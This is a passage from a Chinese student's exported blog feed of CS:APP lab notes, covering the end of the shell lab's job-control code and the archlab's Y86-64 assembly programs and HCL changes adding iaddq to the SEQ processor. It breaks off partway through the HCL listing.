class="number">1</span>]);</span><br><span class="line">        job=<span class="built_in">getjobpid</span>(jobs,id);</span><br><span class="line">        <span class="keyword">if</span>(job==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(%d): No such process\n&quot;</span>,id);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">kill</span>(-(job-&gt;pid),SIGCONT);<span class="comment">//统一把他们的状态都定义成SIGCONT</span></span><br><span class="line">    job-&gt;state=state;</span><br><span class="line">    <span class="keyword">if</span>(state==BG)<span class="comment">//根据状态的不同调整输出</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>,job-&gt;jid,job-&gt;pid,job-&gt;cmdline);</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="built_in">waitfg</span>(job-&gt;pid);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个shell lab没有具体的评分系统，每次都是通过以下两个命令</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">make test01</span><br><span class="line">make rtest01</span><br></pre></td></tr></table></figure>

<p>这种类似的命令来比对1-16个trace文件，而且这个shell是模拟一个shell，故不能通过对拍来判断程序是否正确，因为进程号都不一样，而且这个lab是我学习完课本后放了一个超级长的五一假期然后磨磨蹭蹭做完的，而且抄了大量的别人的代码，只能说这个lab做的有点失败，而且没有进行错误处理包装，错误处理函数是直接复制的，但是还是学到了很多东西。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://zhuanlan.zhihu.com/p/492645370">CSAPP | Lab7-Shell Lab 深入解析 - 知乎 (zhihu.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/667470667">CSAPP shelllab解析 - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>csapp</tag>
        <tag>ECF</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP的lab7-malloclab</title>
    <url>/CSAPP/lab7/2024/03/10/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP的lab8-proxylab</title>
    <url>/CSAPP/lab8/2024/03/10/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP的lab4-archlab</title>
    <url>/CSAPP/lab4/2024/03/14/</url>
    <content><![CDATA[<blockquote>
<p><strong><del>是个屁的邂逅</del></strong>.</p>
<p>为什么这个lab做的时间比cachelab要晚呢?主要是我看小土刀只做了7个lab,然后我又不想看chapter4,导读也说不用看我直接就跳了.谁知道做完cachelab后我把做好的lab一上传,发现我库里有8个lab,然后找到了<a href="https://csapp.cs.cmu.edu/3e/labs.html">lab assignment</a>,原来我直接把这个lab给忽略了,所以呀,现在要掉头回来干这个lab.</p>
</blockquote>
<p>照例给出一些链接,减少大家搜资料的时间成本.(来源于cmu)</p>
<ul>
<li><p><a href="http://csapp.cs.cmu.edu/3e/README-archlab">ReadMe</a></p>
</li>
<li><p><a href="http://csapp.cs.cmu.edu/3e/buflab32.pdf">Writeup</a></p>
</li>
<li><p><a href="http://csapp.cs.cmu.edu/3e/buflab32-handout.tar">Selfstudy handout</a></p>
</li>
</ul>
<h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><p>我们要做Part A,B,C,其中A和B是C的基础,pdf里面说A和B比较简单,C比较难</p>
<p>Y86_64常用指令集</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004832.png" alt="image-20240314230447240"></p>
<ul>
<li>irmovq指令表示将一个<strong>立即数</strong>存进一个<strong>寄存器</strong>中 </li>
<li>rrmovq指令表示将一个<strong>寄存器中的值</strong>存进一个<strong>寄存器</strong>中</li>
<li>rmmovq指令表示将一个<strong>寄存器中的值</strong>存进一个<strong>内存地址所对应的内存</strong>中</li>
<li>mrmovq指令表示将一个<strong>内存中的值</strong>存进一个<strong>寄存器</strong>中</li>
</ul>
<p>所以我们要注意，没有mmmovq，不能将内存中的值和内存中的值进行直接转移，需要拿寄存器存起来。</p>
<h1 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h1><blockquote>
<p>一开始还在纳闷为啥part_A没有教程，自己一做，发现确实简单，就是一些指令的运用热身罢了。坚持坚持，都能做出来的啦！</p>
</blockquote>
<h2 id="Sum-ys"><a href="#Sum-ys" class="headerlink" title="Sum.ys"></a>Sum.ys</h2><blockquote>
<p>RULES:</p>
<p>Write a Y86-64 program sum.ys that iteratively sums the elements of a linked list. Your program should consist of some code that sets up the stack structure, invokes a function, and then halts.<br>In this case,the function should be Y86-64 code for a function (sum list) that is functionally equivalent to the C sum list function in Figure 1.</p>
<p>写一个Y86-64程序sum.ys，迭代地对链表的元素求和。你的程序应该由一些代码组成，这些代码设置堆栈结构，调用函数，然后停止。在这种情况下，该函数应该是Y86-64代码，用于在功能上等同于图1中的C sum list函数的函数（sum list）。使用以下三元素列表测试程序：</p>
</blockquote>
<p>sum list</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">sum_list</span><span class="params">(list_ptr ls)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (ls) &#123;</span><br><span class="line">	val += ls-&gt;val;</span><br><span class="line">	ls = ls-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们就是仿照CSAPP课本中文版p252页的完整Y86-64汇编代码流程翻译Sum_List函数,汇编代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Execution begins at address 0</span><br><span class="line">        .pos 0</span><br><span class="line">        irmovq stack, %rsp</span><br><span class="line">        call main</span><br><span class="line">        halt </span><br><span class="line"># Sample linked list </span><br><span class="line">.align 8</span><br><span class="line">ele1: </span><br><span class="line">        .quad 0x00a</span><br><span class="line">        .quad ele2</span><br><span class="line">ele2:</span><br><span class="line">        .quad 0x0b0</span><br><span class="line">        .quad ele3</span><br><span class="line">ele3:    </span><br><span class="line">        .quad 0xc00</span><br><span class="line">        .quad 0</span><br><span class="line"></span><br><span class="line"># get main</span><br><span class="line">main:</span><br><span class="line">        irmovq ele1, %rdi</span><br><span class="line">        call sum_list       # sum(list_ptr ls)</span><br><span class="line">        ret</span><br><span class="line"># long sum_list(list_ptr ls)</span><br><span class="line"># start in %rdi</span><br><span class="line">sum_list:</span><br><span class="line">        xorq %rax,%rax   #rax--&gt;sum_list=0</span><br><span class="line">        andq %rdi ,%rdi   # test </span><br><span class="line">        jmp test</span><br><span class="line"></span><br><span class="line">loop: </span><br><span class="line">        mrmovq (%rdi),%rsi</span><br><span class="line">        addq %rsi,%rax        </span><br><span class="line">        mrmovq 8(%rdi),%rdi  # rdi---&gt;next</span><br><span class="line">        andq %rdi,%rdi          # test rdi</span><br><span class="line">test: </span><br><span class="line">        jne loop # rdi==0 ret</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">        .pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>

<p>然后使用yas和yis进行测试,若%rax&#x3D;&#x3D;0xcba则成功!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004858.png" alt="image-20240314223820052"></p>
<h2 id="rsum-ys"><a href="#rsum-ys" class="headerlink" title="rsum.ys"></a>rsum.ys</h2><blockquote>
<p><strong>rsum.ys: Recursively sum linked list elements</strong><br>Write a Y86-64 program rsum.ys that recursively sums the elements of a linked list. This code should be similar to the code in sum.ys, except that it should use a function rsum list that recursively sums a<br>list of numbers, as shown with the C function rsum list in Figure 1. Test your program using the same three-element list you used for testing list.ys.</p>
<p>编写一个Y86-64程序rsum.ys，递归地对链表的元素求和。这段代码应该与sum.ys中的代码类似，只是它应该使用一个函数rsum list来递归地对一个数字列表求和，如图1中的C函数rsum list所示。</p>
</blockquote>
<p>rsum_list</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">rsum_list</span><span class="params">(list_ptr ls)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!ls)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="type">long</span> val = ls-&gt;val;</span><br><span class="line">	<span class="type">long</span> rest = rsum_list(ls-&gt;next);</span><br><span class="line">	<span class="keyword">return</span> val + rest;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>递归操作由Bomblab的经验可以知道,肯定需要使用pushq和popq操作,递归调用即可,判断一下地址为0就是递归尽头就好了,简单!~~</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># rsum.ys: Recursively sum linked list elements</span><br><span class="line"># author Vite</span><br><span class="line"></span><br><span class="line"># Execution begins at address 0</span><br><span class="line">        .pos 0</span><br><span class="line">        irmovq stack, %rsp</span><br><span class="line">        call main</span><br><span class="line">        halt </span><br><span class="line"></span><br><span class="line"># Sample linked list </span><br><span class="line">.align 8</span><br><span class="line">ele1: </span><br><span class="line">        .quad 0x00a</span><br><span class="line">        .quad ele2</span><br><span class="line">ele2:</span><br><span class="line">        .quad 0x0b0</span><br><span class="line">        .quad ele3</span><br><span class="line">ele3:    </span><br><span class="line">        .quad 0xc00</span><br><span class="line">        .quad 0</span><br><span class="line"></span><br><span class="line"># get main</span><br><span class="line">main:</span><br><span class="line">        irmovq ele1, %rdi</span><br><span class="line">        call rsum_list</span><br><span class="line">        ret</span><br><span class="line">        </span><br><span class="line"> rsum_list:</span><br><span class="line">        andq %rdi ,%rdi</span><br><span class="line">        je return</span><br><span class="line">        mrmovq (%rdi),%rsi</span><br><span class="line">        mrmovq 8(%rdi),%rdi</span><br><span class="line">        pushq %rsi</span><br><span class="line">        call rsum_list</span><br><span class="line">        popq %rsi</span><br><span class="line">        addq %rsi,%rax</span><br><span class="line">        ret</span><br><span class="line">return:</span><br><span class="line">        irmovq $0x0, %rax</span><br><span class="line">        ret</span><br><span class="line">        .pos 0x200</span><br><span class="line">stack:</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>写完后测试提交,$rax的值正确!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004890.png" alt="image-20240314232113865"></p>
<h2 id="copy-ys"><a href="#copy-ys" class="headerlink" title="copy.ys"></a>copy.ys</h2><blockquote>
<p><strong>copy.ys: Copy a source block to a destination block</strong><br>Write a program (copy.ys) that copies a block of words from one part of memory to another (non-overlapping area) area of memory, computing the checksum (Xor) of all the words copied. Your program should consist of code that sets up a stack frame, invokes a function copy block, and then halts. The function should be functionally equivalent to the C function copy block shown in Figure 1. Test your program using the following three-element source and destination blocks:</p>
<p>编写一个程序（copy.ys），将一个字块从内存的一部分复制到内存的另一个（非重叠区域）区域，计算所有复制的字的校验和（Xor）。你的程序应该由建立堆栈框架、调用函数复制块、然后停止的代码组成。该函数在功能上应等同于图1所示的C函数复制块。</p>
</blockquote>
<p>copy_block</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">copy_block</span><span class="params">(<span class="type">long</span> *src, <span class="type">long</span> *dest, <span class="type">long</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="type">long</span> val = *src++;</span><br><span class="line">	*dest++ = val;</span><br><span class="line">	result ^= val;</span><br><span class="line">	len--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大致思路：</p>
<p>取出src[0]的值,丢到dest[0]中,把%rax的值xor val,然后把len–,每次进入循环要记得判断len,要是len&#x3D;0就退出循环</p>
<p>然后开始仿照前两个函数构建汇编代码，注意语句，<del>反正写的错了他也会告诉你错了，再改就是了</del></p>
<p>故最终的汇编代码为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># copy.ys: Copy a source block to a destination block</span><br><span class="line"># autor Vite</span><br><span class="line"># exe begins in address 0</span><br><span class="line">        .pos 0</span><br><span class="line">        irmovq stack , %rsp</span><br><span class="line">        call main</span><br><span class="line">        halt </span><br><span class="line">#Sample linked </span><br><span class="line">        .align 8</span><br><span class="line"># Source block</span><br><span class="line">src:</span><br><span class="line">        .quad 0x00a</span><br><span class="line">        .quad 0x0b0</span><br><span class="line">        .quad 0xc00</span><br><span class="line"># Destination block</span><br><span class="line">dest:</span><br><span class="line">        .quad 0x111</span><br><span class="line">        .quad 0x222</span><br><span class="line">        .quad 0x333</span><br><span class="line"></span><br><span class="line"># make main</span><br><span class="line">main:</span><br><span class="line">        irmovq src , %rdi</span><br><span class="line">        irmovq dest, %rsi</span><br><span class="line">        irmovq $3 , %rdx</span><br><span class="line">        xorq %rax,%rax </span><br><span class="line">        call copy_block</span><br><span class="line">        ret</span><br><span class="line">        </span><br><span class="line">copy_block:</span><br><span class="line">        andq %rdx,%rdx</span><br><span class="line">        je return </span><br><span class="line">        mrmovq (%rdi), %r8</span><br><span class="line">        rmmovq %r8, (%rsi)</span><br><span class="line">        xorq %r8, %rax</span><br><span class="line">        irmovq $8 ,%r8</span><br><span class="line">        addq %r8,%rdi</span><br><span class="line">        addq %r8,%rsi</span><br><span class="line">        irmovq $1, %r8</span><br><span class="line">        subq %r8 ,%rdx</span><br><span class="line">        call copy_block</span><br><span class="line">return :</span><br><span class="line">        ret</span><br><span class="line">    .pos 0x200</span><br><span class="line"> stack: </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简单教一下，看下%rax中存的返回值，再看下memory中的改变值，类似于下图，完成题目要求，通关Part_A!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004934.png" alt="image-20240316191316678"></p>
<h1 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h1><h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><blockquote>
<p>概要：SEQ课本中文版P278 4.3SEQ的实现，图4-27往后。</p>
<p>直接对着SEQ的流程图进行模仿，挨个把IADDQ这个关键字丢进去。然后编译运行</p>
</blockquote>
<blockquote>
<p>Your task in Part B is to extend the SEQ processor to support the iaddq, described in Homework problems 4.51 and 4.52. To add this instructions, you will modify the file seq-full.hcl, which implements the version of SEQ described in the CS:APP3e textbook. In addition, it contains declarations of some constants that you will need for your solution.</p>
<p>您在B部分的任务是扩展SEQ处理器以支持iaddq，如作业问题4.51和4.52所述。要添加此说明，您需要修改seq-full.hcl文件，该文件实现了CS：APP 3e教科书中描述的SEQ版本。此外，它还包含解决方案所需的一些常数的声明。</p>
</blockquote>
<p>4.51:练习题4.3介绍了iaddq 指令，即将立即数与寄存器相加。描述实现该指令所执行的计算。参考irmovq 和 OPq 指令的计算（图 4-18)</p>
<p>4.52:文件seq-full.hcl包含SEQ的HCL描述,并将常数IIADDQ声明为十六进制值C,也就是 iad­dq的指令代码.修改实现iaddq指令的控制逻辑块的HCL描述,就像练习题4.3和家庭作业4.51中描述的那样.可以参考实验资料获得如何为你的解答生成模拟器以及如何测试模拟器的指导。</p>
<p>图 4-18 给出了对 OPq( 整数和逻辑运算）、rrmovq( 寄存器－寄存器传送）和 irmovq( 立即数－寄存器传送）类型的指令所需的处理。让我们先来考虑一下整数操作。回顾图4-2,可以看到我们小心地选择了指令编码，这样四个整数操作 (addq 、subq 、andq 和 xorq) 都有相同的 icode 值.我们可以以相同的步骤顺序来处理它们，除了 ALU 计算必须根据ifun中编码的具体的指令操作来设定。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004965.png" alt="image-20240316230352428"></p>
<p>iaddq指令如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403180004996.png" alt="image-20240316230542567"></p>
<p>取指阶段：从PC中取</p>
<ol>
<li>取icode:ifun &lt;—M<del>1</del>[PC]</li>
<li>取rA：rB&lt;—M<del>1</del>[PC+1]</li>
<li>取ValC&lt;—M<del>8</del>[PC+2]</li>
<li>更新Valp&lt;–PC+10</li>
</ol>
<p>译码阶段：ValB&lt;—R[rB]</p>
<p>执行阶段：ValE &lt;– ValB-ValC</p>
<p>写回阶段：R[rB]&lt;—ValE</p>
<p>更新PC： PC&lt;—Valp</p>
<p>寄存器 ID dstE 表明写端口E 的目的寄存器，计算出来的值 valE 将放在那里。</p>
<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>需要更新的部分有以下几部分:</p>
<h3 id="Fetch-Stage"><a href="#Fetch-Stage" class="headerlink" title="Fetch Stage"></a>Fetch Stage</h3><ul>
<li>instr_valid&#x3D;icode in</li>
</ul>
<p>该信号判断是否为合法指令</p>
<ul>
<li>need——regids</li>
</ul>
<p>需要读取寄存器rb</p>
<ul>
<li>need_valc</li>
</ul>
<p>需要立即数valC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">################ Fetch Stage     ###################################</span><br><span class="line"></span><br><span class="line">bool instr_valid = icode in </span><br><span class="line">	&#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,</span><br><span class="line">	       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a regid byte?获取的指令是否需要regid字节？</span><br><span class="line">bool need_regids =</span><br><span class="line">	icode in &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, </span><br><span class="line">		     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ&#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a constant word?</span><br><span class="line">bool need_valC =</span><br><span class="line">	icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL,IIADDQ &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Decode-Stage"><a href="#Decode-Stage" class="headerlink" title="Decode Stage"></a>Decode Stage</h3><ul>
<li>srcB:rB</li>
<li>dstE</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## What register should be used as the B source?</span><br><span class="line">word srcB = [</span><br><span class="line">	icode in &#123; IOPQ, IRMMOVQ, IMRMOVQ,IIADDQ  &#125; : rB;</span><br><span class="line">	icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE;  # Don&#x27;t need register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What register should be used as the E destination?</span><br><span class="line">word dstE = [</span><br><span class="line">	icode in &#123; IRRMOVQ &#125; &amp;&amp; Cnd : rB;</span><br><span class="line">	icode in &#123; IIRMOVQ, IOPQ,IIADDQ&#125; : rB;</span><br><span class="line">	icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE;  # Don&#x27;t write any register</span><br><span class="line">];</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Execute-Stage"><a href="#Execute-Stage" class="headerlink" title="Execute Stage"></a>Execute Stage</h3><ul>
<li>aluA:valC</li>
<li>aluB:valB</li>
<li>set_cc</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">################ Execute Stage   ###################################</span><br><span class="line"></span><br><span class="line">## Select input A to ALU</span><br><span class="line">word aluA = [</span><br><span class="line">	icode in &#123; IRRMOVQ, IOPQ &#125; : valA;</span><br><span class="line">	icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ,IIADDQ &#125; : valC;</span><br><span class="line">	icode in &#123; ICALL, IPUSHQ &#125; : -8;</span><br><span class="line">	icode in &#123; IRET, IPOPQ &#125; : 8;</span><br><span class="line">	# Other instructions don&#x27;t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select input B to ALU</span><br><span class="line">word aluB = [</span><br><span class="line">	icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, </span><br><span class="line">		      IPUSHQ, IRET, IPOPQ,IIADDQ &#125; : valB;</span><br><span class="line">	icode in &#123; IRRMOVQ, IIRMOVQ &#125; : 0;</span><br><span class="line">	# Other instructions don&#x27;t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Should the condition codes be updated?</span><br><span class="line">bool set_cc = icode in &#123; IOPQ, IIADDQ&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="Memory-Stage-PC-update"><a href="#Memory-Stage-PC-update" class="headerlink" title="Memory Stage &amp;&amp; PC update"></a>Memory Stage &amp;&amp; PC update</h3><p>&#x3D;&#x3D;none&#x3D;&#x3D;</p>
<h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><p>以下是完整代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#/* $begin seq-all-hcl */</span><br><span class="line">####################################################################</span><br><span class="line">#  HCL Description of Control for Single Cycle Y86-64 Processor SEQ   #</span><br><span class="line">#  Copyright (C) Randal E. Bryant, David R. O&#x27;Hallaron, 2010       #</span><br><span class="line">####################################################################</span><br><span class="line"></span><br><span class="line">## Your task is to implement the iaddq instruction</span><br><span class="line">## The file contains a declaration of the icodes</span><br><span class="line">## for iaddq (IIADDQ)</span><br><span class="line">## Your job is to add the rest of the logic to make it work</span><br><span class="line"></span><br><span class="line">####################################################################</span><br><span class="line">#    C Include&#x27;s.  Don&#x27;t alter these    #不要改变这些                           #</span><br><span class="line">####################################################################</span><br><span class="line"></span><br><span class="line">quote &#x27;#include &lt;stdio.h&gt;&#x27;</span><br><span class="line">quote &#x27;#include &quot;isa.h&quot;&#x27;</span><br><span class="line">quote &#x27;#include &quot;sim.h&quot;&#x27;</span><br><span class="line">quote &#x27;int sim_main(int argc, char *argv[]);&#x27;</span><br><span class="line">quote &#x27;word_t gen_pc()&#123;return 0;&#125;&#x27;</span><br><span class="line">quote &#x27;int main(int argc, char *argv[])&#x27;</span><br><span class="line">quote &#x27;  &#123;plusmode=0;return sim_main(argc,argv);&#125;&#x27;</span><br><span class="line"></span><br><span class="line">####################################################################</span><br><span class="line">#    Declarations.  Do not change/remove/delete any of these       #</span><br><span class="line">####################################################################</span><br><span class="line"></span><br><span class="line">##### Symbolic representation of Y86-64 Instruction Codes Y86-64指令码的符号表示 #############</span><br><span class="line">wordsig INOP 	&#x27;I_NOP&#x27;</span><br><span class="line">wordsig IHALT	&#x27;I_HALT&#x27;</span><br><span class="line">wordsig IRRMOVQ	&#x27;I_RRMOVQ&#x27;</span><br><span class="line">wordsig IIRMOVQ	&#x27;I_IRMOVQ&#x27;</span><br><span class="line">wordsig IRMMOVQ	&#x27;I_RMMOVQ&#x27;</span><br><span class="line">wordsig IMRMOVQ	&#x27;I_MRMOVQ&#x27;</span><br><span class="line">wordsig IOPQ	&#x27;I_ALU&#x27;</span><br><span class="line">wordsig IJXX	&#x27;I_JMP&#x27;</span><br><span class="line">wordsig ICALL	&#x27;I_CALL&#x27;</span><br><span class="line">wordsig IRET	&#x27;I_RET&#x27;</span><br><span class="line">wordsig IPUSHQ	&#x27;I_PUSHQ&#x27;</span><br><span class="line">wordsig IPOPQ	&#x27;I_POPQ&#x27;</span><br><span class="line"># Instruction code for iaddq instruction</span><br><span class="line">wordsig IIADDQ	&#x27;I_IADDQ&#x27;</span><br><span class="line"></span><br><span class="line">##### Symbolic represenations of Y86-64 function codes Y86-64函数代码的符号表示                 #####</span><br><span class="line">wordsig FNONE    &#x27;F_NONE&#x27;        # Default function code</span><br><span class="line"></span><br><span class="line">##### Symbolic representation of Y86-64 Registers referenced explicitly明确引用的Y86-64寄存器的符号表示 #####</span><br><span class="line">wordsig RRSP     &#x27;REG_RSP&#x27;    	# Stack Pointer</span><br><span class="line">wordsig RNONE    &#x27;REG_NONE&#x27;   	# Special value indicating &quot;no register&quot;</span><br><span class="line"></span><br><span class="line">##### ALU Functions referenced explicitly    ALU函数显式引用                        #####</span><br><span class="line">wordsig ALUADD	&#x27;A_ADD&#x27;		# ALU should add its arguments</span><br><span class="line"></span><br><span class="line">##### Possible instruction status values   可能的指令状态值                    #####</span><br><span class="line">wordsig SAOK	&#x27;STAT_AOK&#x27;	# Normal execution</span><br><span class="line">wordsig SADR	&#x27;STAT_ADR&#x27;	# Invalid memory address</span><br><span class="line">wordsig SINS	&#x27;STAT_INS&#x27;	# Invalid instruction</span><br><span class="line">wordsig SHLT	&#x27;STAT_HLT&#x27;	# Halt instruction encountered</span><br><span class="line"></span><br><span class="line">##### Signals that can be referenced by control logic控制逻辑可参考的信号 ####################</span><br><span class="line"></span><br><span class="line">##### Fetch stage inputs		#####</span><br><span class="line">wordsig pc &#x27;pc&#x27;				# Program counter</span><br><span class="line">##### Fetch stage computations	获取阶段计算	#####</span><br><span class="line">wordsig imem_icode &#x27;imem_icode&#x27;		# icode field from instruction memory 来自指令存储器的icode字段</span><br><span class="line">wordsig imem_ifun  &#x27;imem_ifun&#x27; 		# ifun field from instruction memory来自指令存储器的ifun字段</span><br><span class="line">wordsig icode	  &#x27;icode&#x27;		# Instruction control code指令控制码</span><br><span class="line">wordsig ifun	  &#x27;ifun&#x27;		# Instruction function指导作用</span><br><span class="line">wordsig rA	  &#x27;ra&#x27;			# rA field from instruction指令中的rA字段</span><br><span class="line">wordsig rB	  &#x27;rb&#x27;			# rB field from instruction</span><br><span class="line">wordsig valC	  &#x27;valc&#x27;		# Constant from instruction指令中常数</span><br><span class="line">wordsig valP	  &#x27;valp&#x27;		# Address of following instruction</span><br><span class="line">boolsig imem_error &#x27;imem_error&#x27;		# Error signal from instruction memory</span><br><span class="line">boolsig instr_valid &#x27;instr_valid&#x27;	# Is fetched instruction valid?</span><br><span class="line"></span><br><span class="line">##### Decode stage computations		#####</span><br><span class="line">wordsig valA	&#x27;vala&#x27;			# Value from register A port</span><br><span class="line">wordsig valB	&#x27;valb&#x27;			# Value from register B port</span><br><span class="line"></span><br><span class="line">##### Execute stage computations	#####</span><br><span class="line">wordsig valE	&#x27;vale&#x27;			# Value computed by ALU</span><br><span class="line">boolsig Cnd	&#x27;cond&#x27;			# Branch test</span><br><span class="line"></span><br><span class="line">##### Memory stage computations		#####</span><br><span class="line">wordsig valM	&#x27;valm&#x27;			# Value read from memory</span><br><span class="line">boolsig dmem_error &#x27;dmem_error&#x27;		# Error signal from data memory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">####################################################################</span><br><span class="line">#    Control Signal Definitions.   控制信号定义                      #</span><br><span class="line">####################################################################</span><br><span class="line"></span><br><span class="line">################ Fetch Stage     ###################################</span><br><span class="line"></span><br><span class="line"># Determine instruction code</span><br><span class="line">word icode = [</span><br><span class="line">	imem_error: INOP;</span><br><span class="line">	1: imem_icode;		# Default: get from instruction memory</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"># Determine instruction function</span><br><span class="line">word ifun = [</span><br><span class="line">	imem_error: FNONE;</span><br><span class="line">	1: imem_ifun;		# Default: get from instruction memory</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">bool instr_valid = icode in </span><br><span class="line">	&#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,</span><br><span class="line">	       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a regid byte?获取的指令是否需要regid字节？</span><br><span class="line">bool need_regids =</span><br><span class="line">	icode in &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, </span><br><span class="line">		     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ&#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a constant word?</span><br><span class="line">bool need_valC =</span><br><span class="line">	icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL,IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line">################ Decode Stage    ###################################</span><br><span class="line"></span><br><span class="line">## What register should be used as the A source?哪个寄存器应该用作A源</span><br><span class="line">word srcA = [</span><br><span class="line">	icode in &#123; IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ  &#125; : rA;</span><br><span class="line">	icode in &#123; IPOPQ, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE; # Don&#x27;t need register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What register should be used as the B source?</span><br><span class="line">word srcB = [</span><br><span class="line">	icode in &#123; IOPQ, IRMMOVQ, IMRMOVQ,IIADDQ  &#125; : rB;</span><br><span class="line">	icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE;  # Don&#x27;t need register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What register should be used as the E 